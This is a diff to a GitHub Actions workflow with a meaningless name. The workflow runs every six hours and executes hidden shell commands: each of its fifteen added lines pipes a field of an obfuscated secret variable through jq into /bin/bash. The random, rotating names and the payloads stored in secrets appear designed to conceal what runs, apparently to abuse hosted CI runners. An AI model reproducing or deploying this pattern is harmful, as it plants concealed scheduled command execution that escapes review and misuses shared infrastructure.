@@ -3,24 +3,30 @@ name: minidisctransire
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 0/6 * * *'
+    - cron: '39 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: minidisctransire
         env:
-          qexi85: ${{ secrets.qexi85 }}
+          aoq80068: ${{ secrets.aoq80068 }}
         run: |
-          echo $qexi85 | jq -r .fe79953 | /bin/bash
-          echo $bzw29 | jq -r .v40902 | /bin/bash
-          echo $qhx86718 | jq -r .o1061 | /bin/bash
-          echo $k97 | jq -r .oloi4 | /bin/bash
-          echo $iok13973 | jq -r .o591 | /bin/bash
-          echo $syw3878 | jq -r .tqfyl316 | /bin/bash
-          echo $djasr0 | jq -r .cupuc70 | /bin/bash
-          echo $s12 | jq -r .fglrx21 | /bin/bash
-          echo $vmj91008 | jq -r .wjfcj776 | /bin/bash
+          echo $aoq80068 | jq -r .e65610 | /bin/bash
+          echo $ugsbb9 | jq -r .agk62 | /bin/bash
+          echo $j05388 | jq -r .urhot9641 | /bin/bash
+          echo $ymu01 | jq -r .bm2 | /bin/bash
+          echo $zwk7976 | jq -r .iqr9 | /bin/bash
+          echo $pkt83 | jq -r .gv6816 | /bin/bash
+          echo $jbv67121 | jq -r .dfbvy403 | /bin/bash
+          echo $of78880 | jq -r .wn91 | /bin/bash
+          echo $cjjk0198 | jq -r .hmsh8185 | /bin/bash
+          echo $yc0514 | jq -r .lupa877 | /bin/bash
+          echo $rzkq97 | jq -r .ovkjy84707 | /bin/bash
+          echo $say606 | jq -r .pmzp968 | /bin/bash
+          echo $gezd74687 | jq -r .ivgj03 | /bin/bash
+          echo $hqll551 | jq -r .bu32554 | /bin/bash
+          echo $iv7991 | jq -r .kv9079 | /bin/bash
 
